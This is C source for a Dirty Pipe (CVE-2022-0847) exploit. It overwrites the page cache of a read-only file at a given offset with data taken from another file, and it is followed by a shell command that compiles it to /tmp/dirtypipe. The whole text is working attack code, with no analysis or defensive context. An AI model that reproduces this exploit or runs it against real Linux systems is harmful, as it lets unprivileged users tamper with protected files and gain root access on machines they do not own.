/* CVE-2022-0847 Dirty Pipe - modify page cache of a read-only file */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <unistd.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2]) {
  if (pipe(p)) abort();
  const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
  static char buffer[4096];
  for (unsigned r = pipe_size; r > 0;) {
    unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    write(p[1], buffer, n);
    r -= n;
  }
  for (unsigned r = pipe_size; r > 0;) {
    unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    read(p[0], buffer, n);
    r -= n;
  }
}

int main(int argc, char **argv) {
  if (argc != 4) {
    fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATAFILE\n", argv[0]);
    return EXIT_FAILURE;
  }
  const char *const path = argv[1];
  loff_t offset = strtoul(argv[2], NULL, 0);
  const char *dataf = argv[3];

  FILE *df = fopen(dataf, "rb");
  if (!df) { perror("open data"); return 1; }
  static char data[PAGE_SIZE*4];
  size_t data_size = fread(data, 1, sizeof(data), df);
  fclose(df);
  fprintf(stderr, "data_size=%zu offset=%lld\n", data_size, (long long)offset);

  int fd = open(path, O_RDONLY);
  if (fd < 0) { perror("open target"); return 1; }
  struct stat st;
  if (fstat(fd, &st)) { perror("stat"); return 1; }

  if (offset % PAGE_SIZE == 0) { fprintf(stderr,"offset must not be page aligned\n"); return 1; }
  loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
  loff_t end_offset = offset + (loff_t)data_size;
  if (end_offset > next_page) { fprintf(stderr,"cannot write across page boundary\n"); return 1; }

  int p[2];
  prepare_pipe(p);

  ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
  if (nbytes < 0) { perror("splice"); return 1; }
  if (nbytes == 0) { fprintf(stderr,"short splice\n"); return 1; }

  nbytes = write(p[1], data, data_size);
  if (nbytes < 0) { perror("write"); return 1; }
  fprintf(stderr, "wrote %zd bytes\n", nbytes);
  printf("It worked?\n");
  return 0;
}
EOF
gcc -O2 -o /tmp/dirtypipe /tmp/dirtypipe.c 2>&1 && echo "COMPILED"
